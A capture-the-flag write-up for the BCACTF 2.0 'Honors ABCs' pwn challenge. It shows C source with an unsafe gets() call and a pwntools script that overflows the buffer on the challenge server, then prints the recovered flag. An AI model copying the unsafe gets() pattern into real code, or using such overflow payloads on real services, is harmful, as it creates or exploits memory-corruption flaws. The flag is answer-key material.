![Challenge](https://github.com/ZeroCooL-555/CTF/blob/master/BCACTF%202.0/pwn/Honors%20ABCs/challenge.png)
# Vulnerability discovery

```c
int main() {
    int grade = 0;
    char response[50];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Welcome to your first class at BCA: Honors-level ABCs.");
    puts("Because we expect all our students to be perfect, I'm not going to teach you anything.");
    sleep(2);
    puts("Instead, we're going to have a quiz!");
    puts("And, of course, I expect all of you to know the material already.");
    sleep(2);
    puts("");
    puts("╔════════════════════════╗");
    puts("║ THE QUIZ               ║");
    puts("║                        ║");
    puts("║ 1) Recite the alphabet ║");
    puts("╚════════════════════════╝");
    puts("");
    printf("Answer for 1: ");
    gets(response); // Buffer-Overflow Here
```

**Line 29** Contains a dangerous function `gets()` which can lead
to a buffer overflow

# Exploitation

```python
#!/usr/bin/env python3

from pwn import *

payload = b"A"*80
r = remote('bin.bcactf.com', 49155)
log.info('Sending payload')
r.sendlineafter('Answer for 1: ', payload)
log.success('Payload sent')
r.recvuntil('Let me recite the BCA plagarism policy.', timeout=10)
log.progress('Parsing data for flag')

while True:
    try:
        flag = r.recvline()
        if b"bcactf{" in flag:
            log.success(flag.decode())
            break
    except EOFError:
        log.warning('Error Parsing Data...Try again')
        break

#FLAG: bcactf{now_i_know_my_A_B_Cs!!_next_time_wont_you_cheat_with_me??}
```
